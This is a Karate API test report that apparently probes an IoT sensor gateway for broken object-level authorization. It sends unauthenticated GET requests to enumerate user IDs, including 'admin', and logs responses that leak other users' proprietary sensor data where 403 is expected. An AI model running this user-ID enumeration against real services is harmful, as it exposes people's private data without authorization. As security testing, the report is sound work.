[{"line":1,"elements":[{"line":3,"name":"","description":"","type":"background","keyword":"Background","steps":[{"name":"url 'http:\/\/192.168.1.109:48080'","result":{"duration":349800,"status":"passed"},"match":{"location":"karate","arguments":[]},"keyword":"*","line":4}]},{"start_timestamp":"2025-03-26T12:52:16.844Z","line":6,"name":"Test authorization bypass through user ID enumeration","description":"","id":"test-authorization-bypass-through-user-id-enumeration","type":"scenario","keyword":"Scenario","steps":[{"name":"path '\/users\/user1\/sensors'","result":{"duration":893100,"status":"passed"},"match":{"location":"karate","arguments":[]},"comments":["# First access a legitimate user's sensors"],"keyword":"Given","line":8},{"name":"method get","result":{"duration":25711400,"status":"passed"},"match":{"location":"karate","arguments":[]},"keyword":"When","line":9,"doc_string":{"content_type":"","value":"14:52:16.851 request:\n1 > GET http:\/\/192.168.1.109:48080\/users\/user1\/sensors\n1 > Host: 192.168.1.109:48080\n1 > Connection: Keep-Alive\n1 > User-Agent: Apache-HttpClient\/4.5.14 (Java\/11.0.17)\n1 > Accept-Encoding: gzip,deflate\n\n\n14:52:16.869 response time in milliseconds: 17\n1 < 200\n1 < Content-Type: application\/json\n1 < Content-Length: 845\n1 < Server: Werkzeug\/2.0.1 Python\/3.9.21\n1 < Date: Wed, 26 Mar 2025 12:52:18 GMT\n{\"TEMP001\":{\"basic_data\":{\"confidence\":1.0,\"data_source\":\"minimal_format\",\"gateway_timestamp\":1742865408.562495,\"location\":\"greenhouse-1\",\"sensor_id\":\"TEMP001\",\"temperature\":24.139999389648438,\"timestamp\":1742865408,\"type\":\"temperature\",\"unit\":\"celsius\"},\"sensitive_data\":{\"alert_thresholds\":{\"high\":35.0,\"low\":15.0},\"proprietary_settings\":{\"growth_factor\":1.2,\"nutrient_mix\":\"formula-103\"},\"yield_prediction\":\"85.3 tons\/hectare\"}},\"TEMP002\":{\"basic_data\":{\"confidence\":1.0,\"data_source\":\"minimal_format\",\"gateway_timestamp\":1742865405.8499749,\"location\":\"unknown\",\"sensor_id\":\"TEMP002\",\"temperature\":24.32,\"timestamp\":1742865405.0,\"type\":\"unknown\",\"unit\":\"unknown\"},\"sensitive_data\":{\"alert_thresholds\":{\"high\":32.0,\"low\":18.0},\"proprietary_settings\":{\"growth_factor\":1.4,\"nutrient_mix\":\"formula-205\"},\"yield_prediction\":\"92.7 tons\/hectare\"}}}\n\n\n","line":9}},{"name":"status 200","result":{"duration":17500,"status":"passed"},"match":{"location":"karate","arguments":[]},"keyword":"Then","line":10},{"name":"match response != null","result":{"duration":1513400,"status":"passed"},"match":{"location":"karate","arguments":[]},"keyword":"And","line":11},{"name":"match response['TEMP001'] != null","result":{"duration":2147000,"status":"passed"},"match":{"location":"karate","arguments":[]},"keyword":"And","line":12},{"name":"path '\/users\/premium_user\/sensors'","result":{"duration":580700,"status":"passed"},"match":{"location":"karate","arguments":[]},"comments":["# Test access to different user's sensors without authentication (BOLA vulnerability)"],"keyword":"Given","line":15},{"name":"method get","result":{"duration":30193400,"status":"passed"},"match":{"location":"karate","arguments":[]},"keyword":"When","line":16,"doc_string":{"content_type":"","value":"14:52:16.891 request:\n2 > GET http:\/\/192.168.1.109:48080\/users\/premium_user\/sensors\n2 > Host: 192.168.1.109:48080\n2 > Connection: Keep-Alive\n2 > User-Agent: Apache-HttpClient\/4.5.14 (Java\/11.0.17)\n2 > Accept-Encoding: gzip,deflate\n\n\n14:52:16.907 response time in milliseconds: 16\n2 < 200\n2 < Content-Type: application\/json\n2 < Content-Length: 480\n2 < Server: Werkzeug\/2.0.1 Python\/3.9.21\n2 < Date: Wed, 26 Mar 2025 12:52:18 GMT\n{\"TEMP004\":{\"basic_data\":{\"gateway_timestamp\":1742865407.0622792,\"sensor_id\":\"TEMP004\",\"temperature\":24.6,\"timestamp\":1742865407.0611646,\"unit\":\"celsius\"},\"sensitive_data\":{\"advanced_metrics\":{\"crop_stress_indicators\":[0.12,0.08,0.15],\"optimal_harvest_window\":\"2025-07-15 to 2025-07-25\",\"soil_health_index\":89.2},\"alert_thresholds\":{\"high\":34.0,\"low\":17.0},\"proprietary_settings\":{\"growth_factor\":1.8,\"nutrient_mix\":\"premium-formula-X\"},\"yield_prediction\":\"105.2 tons\/hectare\"}}}\n\n\n","line":16}},{"name":"status 200  # Should be 403 if properly secured","result":{"duration":17200,"status":"passed"},"match":{"location":"karate","arguments":[]},"keyword":"Then","line":17},{"name":"match response != null","result":{"duration":705200,"status":"passed"},"match":{"location":"karate","arguments":[]},"keyword":"And","line":18},{"name":"match response['TEMP004'] != null","result":{"duration":1927000,"status":"passed"},"match":{"location":"karate","arguments":[]},"keyword":"And","line":19},{"name":"match response['TEMP004'].sensitive_data != null","result":{"duration":969100,"status":"passed"},"match":{"location":"karate","arguments":[]},"keyword":"And","line":20},{"name":"path '\/users\/admin\/sensors'","result":{"duration":806200,"status":"passed"},"match":{"location":"karate","arguments":[]},"comments":["# Test access to admin user's sensors without authentication (BOLA vulnerability)"],"keyword":"Given","line":23},{"name":"method get","result":{"duration":16994700,"status":"passed"},"match":{"location":"karate","arguments":[]},"keyword":"When","line":24,"doc_string":{"content_type":"","value":"14:52:16.917 request:\n3 > GET http:\/\/192.168.1.109:48080\/users\/admin\/sensors\n3 > Host: 192.168.1.109:48080\n3 > Connection: Keep-Alive\n3 > User-Agent: Apache-HttpClient\/4.5.14 (Java\/11.0.17)\n3 > Accept-Encoding: gzip,deflate\n\n\n14:52:16.928 response time in milliseconds: 11\n3 < 200\n3 < Content-Type: application\/json\n3 < Content-Length: 1323\n3 < Server: Werkzeug\/2.0.1 Python\/3.9.21\n3 < Date: Wed, 26 Mar 2025 12:52:18 GMT\n{\"TEMP001\":{\"basic_data\":{\"confidence\":1.0,\"data_source\":\"minimal_format\",\"gateway_timestamp\":1742865408.562495,\"location\":\"greenhouse-1\",\"sensor_id\":\"TEMP001\",\"temperature\":24.139999389648438,\"timestamp\":1742865408,\"type\":\"temperature\",\"unit\":\"celsius\"},\"sensitive_data\":{\"alert_thresholds\":{\"high\":35.0,\"low\":15.0},\"proprietary_settings\":{\"growth_factor\":1.2,\"nutrient_mix\":\"formula-103\"},\"yield_prediction\":\"85.3 tons\/hectare\"}},\"TEMP002\":{\"basic_data\":{\"confidence\":1.0,\"data_source\":\"minimal_format\",\"gateway_timestamp\":1742865405.8499749,\"location\":\"unknown\",\"sensor_id\":\"TEMP002\",\"temperature\":24.32,\"timestamp\":1742865405.0,\"type\":\"unknown\",\"unit\":\"unknown\"},\"sensitive_data\":{\"alert_thresholds\":{\"high\":32.0,\"low\":18.0},\"proprietary_settings\":{\"growth_factor\":1.4,\"nutrient_mix\":\"formula-205\"},\"yield_prediction\":\"92.7 tons\/hectare\"}},\"TEMP004\":{\"basic_data\":{\"gateway_timestamp\":1742865407.0622792,\"sensor_id\":\"TEMP004\",\"temperature\":24.6,\"timestamp\":1742865407.0611646,\"unit\":\"celsius\"},\"sensitive_data\":{\"advanced_metrics\":{\"crop_stress_indicators\":[0.12,0.08,0.15],\"optimal_harvest_window\":\"2025-07-15 to 2025-07-25\",\"soil_health_index\":89.2},\"alert_thresholds\":{\"high\":34.0,\"low\":17.0},\"proprietary_settings\":{\"growth_factor\":1.8,\"nutrient_mix\":\"premium-formula-X\"},\"yield_prediction\":\"105.2 tons\/hectare\"}}}\n\n\n","line":24}},{"name":"status 200  # Should be 403 if properly secured","result":{"duration":20600,"status":"passed"},"match":{"location":"karate","arguments":[]},"keyword":"Then","line":25},{"name":"match response != null","result":{"duration":843900,"status":"passed"},"match":{"location":"karate","arguments":[]},"keyword":"And","line":26},{"name":"path '\/users\/nonexistent\/sensors'","result":{"duration":589300,"status":"passed"},"match":{"location":"karate","arguments":[]},"comments":["# Test access to non-existent user"],"keyword":"Given","line":29},{"name":"method get","result":{"duration":27695800,"status":"passed"},"match":{"location":"karate","arguments":[]},"keyword":"When","line":30,"doc_string":{"content_type":"","value":"14:52:16.940 request:\n4 > GET http:\/\/192.168.1.109:48080\/users\/nonexistent\/sensors\n4 > Host: 192.168.1.109:48080\n4 > Connection: Keep-Alive\n4 > User-Agent: Apache-HttpClient\/4.5.14 (Java\/11.0.17)\n4 > Accept-Encoding: gzip,deflate\n\n\n14:52:16.960 response time in milliseconds: 19\n4 < 404\n4 < Content-Type: application\/json\n4 < Content-Length: 39\n4 < Server: Werkzeug\/2.0.1 Python\/3.9.21\n4 < Date: Wed, 26 Mar 2025 12:52:18 GMT\n{\"error\":\"User nonexistent not found\"}\n\n\n","line":30}},{"name":"status 404","result":{"duration":21600,"status":"passed"},"match":{"location":"karate","arguments":[]},"keyword":"Then","line":31},{"name":"match response.error == 'User nonexistent not found'","result":{"duration":1776100,"status":"passed"},"match":{"location":"karate","arguments":[]},"keyword":"And","line":32}],"tags":[]}],"name":"ID_004_krtestoas_mqtt_reconnect_POST_verified.feature","description":"IoT Gateway BOLA Vulnerability Tests","id":"iot-gateway-bola-vulnerability-tests","keyword":"Feature","uri":"ID_004_krtestoas_mqtt_reconnect_POST_verified.feature"}]